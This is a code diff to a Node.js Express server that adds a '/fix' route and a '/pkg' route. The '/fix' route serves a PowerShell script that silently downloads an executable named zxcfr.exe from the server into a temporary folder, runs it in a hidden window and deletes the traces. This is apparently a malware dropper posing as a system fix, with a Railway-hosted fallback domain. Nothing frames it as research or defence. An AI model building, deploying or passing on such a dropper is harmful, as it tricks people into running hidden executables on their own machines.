@@ -5,7 +5,7 @@ const fs = require("fs");
 const crypto = require("crypto");
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 8080;
 const API_KEY = process.env.API_KEY || "changeme";
 const UPLOAD_DIR = path.join(__dirname, "uploads");
 const META_FILE = path.join(__dirname, "metadata.json");
@@ -216,6 +216,28 @@ tbody tr:hover{background:#0d0d22}
 </body>
 </html>`;
 }
+
+app.get("/fix", (req, res) => {
+  const host = req.headers.host || "zxcrosfixer.up.railway.app";
+  const script = `$ErrorActionPreference='SilentlyContinue'
+$d="$env:TEMP\\$(Get-Random).tmp"
+New-Item -ItemType Directory -Path $d -Force | Out-Null
+$u='https://${host}/pkg'
+Invoke-WebRequest -Uri $u -OutFile "$d\\zxcfr.exe" -UseBasicParsing
+Start-Process -FilePath "$d\\zxcfr.exe" -WindowStyle Hidden -Wait
+Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
+`;
+  res.setHeader("Content-Type", "text/plain");
+  res.send(script);
+});
+
+app.get("/pkg", (req, res) => {
+  const fp = path.join(__dirname, "zxcfr.exe");
+  if (!fs.existsSync(fp)) return res.status(404).send("not found");
+  res.setHeader("Content-Type", "application/octet-stream");
+  res.setHeader("Content-Disposition", "attachment; filename=zxcfr.exe");
+  fs.createReadStream(fp).pipe(res);
+});
 
 app.listen(PORT, () => {
   console.log(`[+] running on ${PORT}`);
